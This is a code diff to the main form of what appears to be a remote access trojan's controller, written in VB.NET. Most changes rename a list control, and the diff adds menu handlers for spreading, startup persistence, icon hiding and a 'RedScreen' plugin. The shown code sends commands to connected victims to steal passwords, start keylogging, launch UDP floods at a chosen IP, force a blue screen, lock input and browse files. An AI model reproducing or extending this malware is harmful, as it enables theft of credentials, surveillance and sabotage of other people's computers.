@@ -38,7 +38,10 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        Timer2.Start()
         MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)
+
     End Sub
 
 
@@ -77,8 +80,8 @@ Public Class Form1
 
     Public Sub RD(ByVal lp As NetworkStream, ByVal id As String)
         Dim foorm As New RViewerForm
-        foorm.Label4.Text = ListView2.SelectedItems(0).Text
-        foorm.Text = ListView2.SelectedItems(0).Text
+        foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
+        foorm.Text = AeroListView1.SelectedItems(0).Text
 
         Dim h As New Thread(Sub() Application.Run(foorm))
 
@@ -149,7 +152,7 @@ Public Class Form1
             serve.Stop()
 
             Timer1.Stop()
-            ListView2.Items.Clear()
+            AeroListView1.Items.Clear()
             CliSt.Clear()
             RDPViewer.Stop()
             UcBtnExt1.BtnText = "Listen !"
@@ -229,7 +232,7 @@ Public Class Form1
                                 Dim n As String = l.ToString.Replace("|IDDEND|", "")
 
                                 Dim rhejk As String() = Split(n, "|IDD|")
-                                Countries.GetFlags(id, ImageList1, ListView2, rhejk)
+                                Countries.GetFlags(id, ImageList1, AeroListView1, rhejk)
 
                                 l.Clear()
                             Catch ex As Exception
@@ -475,9 +478,9 @@ Public Class Form1
             Next
 
         Catch ex As Exception
-            For Each az As ListViewItem In ListView2.Items
+            For Each az As ListViewItem In AeroListView1.Items
                 If az.Text = klm.Client.RemoteEndPoint.ToString Then
-                    ListView2.Items.Remove(az)
+                    AeroListView1.Items.Remove(az)
                     CliSt.Remove(klm)
 
                 End If
@@ -801,7 +804,8 @@ Public Class Form1
        "\PLUGINS\TASKS.dll",
         "\PLUGINS\HWDR.dll",
          "\PLUGINS\DSK.dll",
-         "\PLUGINS\MSCT.dll"
+         "\PLUGINS\MSCT.dll",
+             "\PLUGINS\VRSA.dll"
     }
 
 
@@ -813,49 +817,51 @@ Public Class Form1
     Public PL_HWDR As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(5)))
     Public PL_DSK As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(6)))
     Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
+    Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
+    '
 #End Region
 
 
 #Region "ToolStrip Clients Sender"
 
     Private Async Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
             Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
         End If
     End Sub
 
 
     Private Async Sub MessageToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim MSG As String = InputBox("Put a message : ")
             Dim o As String = PL_MISC & "|SP1|" & MSG & "|SP2|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub CloseDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseDeleteToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = "|CLOSETHISSHIT|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = "|CLOSEONLY|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -865,57 +871,57 @@ Public Class Form1
     End Sub
 
     Private Async Sub LogOutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogOutToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|LGT|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub ShutDownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutDownToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|STD|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub BSODToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BSODToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|BSOD|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
 
             Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|YES|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -929,37 +935,37 @@ Public Class Form1
 
     Private Async Sub TestToolStripMenuItem_Click(sender As Object, e As EventArgs)
         'PL_DDOS
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & "127.0.0.1" & "|SP2|" & "808080" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
 
     Private Async Sub UDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UDPToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim j As String = InputBox("Set IP : ")
             Dim az As String = InputBox("Set Number of Requests : ")
             Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & j & "|SP2|" & az & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
 
             Dim o As String = PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKS|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -968,10 +974,10 @@ Public Class Form1
 
     Private Async Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
 
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
             'ViewerFormHelper
             'ViewerFormHelper = New RViewerForm
-            ' ViewerFormHelper.Text = ListView2.SelectedItems(0).Text
+            ' ViewerFormHelper.Text = AeroListView1.SelectedItems(0).Text
             'ViewerFormHelper.Show()
 
 
@@ -979,7 +985,7 @@ Public Class Form1
 
             Dim o As String = "1800" & "|SRDV|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -987,7 +993,7 @@ Public Class Form1
 
 
     Private Async Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
 
@@ -996,14 +1002,14 @@ Public Class Form1
 
             Dim o As String = "1800" & "|TRDV|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
 
         End If
     End Sub
 
     Private Async Sub ChangeWallPaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWallPaperToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
             Using FF As New OpenFileDialog
                 If FF.ShowDialog = DialogResult.OK Then
                     ' Dim j As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(FF.FileName))
@@ -1013,75 +1019,75 @@ Public Class Form1
                     Dim j2 As String = Await Task.Run(Function() IO.File.ReadAllText(FF.FileName, Encoding.Default))
                     Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SETWP|" & "|SP2|" & j2 & "|SP2|" & F & "|ENDING|"
 
-                    Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+                    Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
                 End If
             End Using
         End If
     End Sub
 
     Private Async Sub OSInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OSInformationToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub TestToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles TestToolStripMenuItem1.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|LCKKB|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HTB|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|STB|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub HideAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideAppsToolStripMenuItem.Click
 
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HATB|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub ShowAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowAppsToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SATB|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -1089,12 +1095,12 @@ Public Class Form1
 
     Private Async Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
         '  SWAPON
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPON|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
 
@@ -1103,12 +1109,12 @@ Public Class Form1
     Private Async Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
         ' SWAPOFF
 
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPOFF|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -1116,23 +1122,23 @@ Public Class Form1
 
 
     Private Async Sub LockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockKeyboardToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STARTKBLG|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub UnlockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnlockKeyboardToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STOPKBLG|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
@@ -1141,113 +1147,202 @@ Public Class Form1
 
 
     Private Async Sub Test1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test1ToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub Test2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test2ToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub LeftLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftLockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLEFT|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub LeftUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftUnlockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub RightLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightLockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLRIGHT|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub RightUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightUnlockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub MouveLockingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveLockingToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub MouveUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveUnlockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub AllLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllLockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKALL|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
     End Sub
 
     Private Async Sub AllUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllUnlockToolStripMenuItem.Click
-        If ListView2.SelectedItems.Count = 1 Then
+        If AeroListView1.SelectedItems.Count = 1 Then
 
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
-            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, ListView2.SelectedItems(0).Text, o))
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+    End Sub
+
+    Private Async Sub ShowIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowIconsToolStripMenuItem.Click
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SDI|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub HideIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideIconsToolStripMenuItem.Click
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HDI|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub ShowStartIconToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowStartIconToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SSI|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub StartIconHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartIconHideToolStripMenuItem1.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HSI|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub SpreadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SpreadToolStripMenuItem.Click
+        '|SPREAD|
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPREAD|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub AddToStarUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToStarUpToolStripMenuItem.Click
+        '"|ATSRP|"
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub RedScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedScreenToolStripMenuItem.Click
+        '
+
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|RDSC|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
     End Sub
 
 
